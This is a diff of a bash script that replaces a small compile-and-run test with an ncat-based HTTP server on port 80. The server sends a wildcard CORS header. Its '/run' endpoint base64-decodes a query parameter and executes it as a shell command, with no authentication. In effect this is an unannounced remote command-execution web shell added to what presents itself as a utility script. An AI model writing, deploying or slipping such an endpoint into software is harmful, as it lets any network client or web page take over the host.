@@ -2,44 +2,47 @@
 
 set -x
 
-{
+if [[ -n "$1" ]]
+then
+    ajaxheader="HTTP/1.1 200 OK\nServer: cweb/1.0\nAccess-Control-Allow-Headers: X-Requested-With\nAccess-Control-Allow-Origin: *\nConnection: close\nContent-Type: text\n\n"
+    requestsring=${1%?}
+    part=($requestsring)
 
-echo "@"
-echo "$@"
+    echo -e "$ajaxheader"
 
-date
+    action="${part[0]}"
+    context="${part[1]%\?*}"
+    parameter="${part[1]#*\?}"
 
-echo "TEST script"
+    if [[ "$action" == "OPTIONS" ]]
+    then
+        exit
 
-pwd
-ls
-id
+    elif [[ "$context" == "/someshit" ]]
+    then
+        echo "thats nice"
 
-apk --no-cache add gcc g++ make
+    elif [[ "$context" == "/run" ]]
+    then
+        command=`echo "$parameter" |base64 -d`
 
-echo '#include <stdio.h>
+        echo "command=|$command|"
 
-int main()
-{
-    puts ("Hello");
+        $command 2>&1
 
-    return 0;
-}
-' >test.cpp
+    elif [[ "$context" == "/dosummat" ]]
+    then
+        hostname 2>&1
 
+    else
+        echo "request=|${requestsring}| context=|${context}| parameter=|${parameter}|"
 
-gcc test.cpp -o test
-./test
-rm -vf test
+        echo -e "$(date) request=|${requestsring}| part[1]=|${part[1]}|"
+    fi
 
-echo '
-test: test.cpp
-	gcc test.cpp -o test
-' >Makefile
+    exit
+fi
 
-make
-./test
+which ncat || apk add ncat
 
-exit 0
-
-} 2>@1
+ncat -v -k -l -p 80 -c 'read request; '"$0"' "$request"'
